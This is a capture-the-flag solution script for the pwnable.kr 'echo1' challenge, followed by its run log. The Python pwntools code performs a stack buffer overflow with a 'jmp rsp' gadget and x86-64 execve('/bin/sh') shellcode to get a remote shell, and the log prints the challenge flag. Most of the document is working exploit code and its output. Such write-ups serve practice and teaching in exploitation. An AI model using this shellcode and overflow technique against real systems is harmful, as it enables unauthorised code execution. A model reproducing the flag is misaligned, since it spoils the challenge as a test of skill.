'''

Description:

    Pwn this echo service.
    
    download : http://pwnable.kr/bin/echo1
    
    Running at : nc pwnable.kr 9010
    
Solution

Solver:
'''

from pwn import *

debug = False
if debug:
    p = process('./echo1')
else:
    p = remote('pwnable.kr', 9010)
    
overflow  = 'H' * 0x28
ret_addr  = '\xa0\x20\x60\x00\x00\x00\x00\x00'
shellcode = '\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05'

payload = overflow + ret_addr + shellcode + '\n'

print repr(p.recvuntil(':'))
p.send('\xff\xe4\n')
print repr(p.recvuntil('>'))
p.send('1\n')
print repr(p.recvuntil('\n'))
p.send(payload)
print p.recvuntil('\n')
p.interactive()

'''
Log:
    
[+] Opening connection to pwnable.kr on port 9010: Done
"hey, what's your name? :"
' \n- select echo type -\n- 1. : BOF echo\n- 2. : FSB echo\n- 3. : UAF echo\n- 4. : exit\n>'
' hello \xff\xe4\n'
HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH\xa0 `

[*] Switching to interactive mode
goodbye \xff 
            $ cat flag
H4d_som3_fun_w1th_ech0_ov3rfl0w
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 9010
'''
